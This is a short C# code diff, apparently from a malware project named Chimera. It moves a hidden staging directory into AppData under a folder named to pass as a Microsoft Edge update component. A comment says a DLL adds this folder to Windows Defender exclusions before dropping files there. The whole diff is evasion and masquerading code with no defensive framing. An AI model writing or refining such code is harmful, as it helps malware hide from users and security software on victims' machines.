@@ -8,7 +8,12 @@ namespace Chimera
     // The DLL adds this directory to Defender exclusions before dropping files here.
     public static class Staging
     {
-        public const string Dir = @"C:\Users\Public";
+        // Use current user's AppData\Roaming — always writable without elevation.
+        // Disguised as a legit-looking Microsoft subfolder.
+        public static readonly string Dir =
+            System.IO.Path.Combine(
+                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                "Microsoft", "EdgeUpdate");
 
         public static void EnsureDir()
         {
@@ -19,7 +24,7 @@ namespace Chimera
                     Directory.CreateDirectory(Dir);
                     // Hide it
                     File.SetAttributes(Dir,
-                        File.GetAttributes(Dir) | FileAttributes.Hidden | FileAttributes.System);
+                        File.GetAttributes(Dir) | FileAttributes.Hidden);
                 }
             }
             catch { /* best-effort */ }
